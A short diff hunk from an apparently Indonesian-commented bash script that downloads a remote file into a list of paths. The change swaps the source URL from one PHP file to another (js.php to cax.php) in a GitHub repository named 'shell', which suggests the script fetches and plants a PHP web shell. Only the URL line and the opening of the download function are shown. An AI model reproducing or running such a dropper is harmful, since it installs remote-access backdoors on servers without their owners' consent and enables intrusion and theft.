@@ -22,7 +22,7 @@ FILES=(
 )
 
 # URL file sumber
-URL="https://raw.githubusercontent.com/Kennn403/shell/refs/heads/main/js.php"
+URL="https://raw.githubusercontent.com/kennn403/shell/refs/heads/main/cax.php"
 
 # Fungsi untuk mengunduh file
 download_file() {
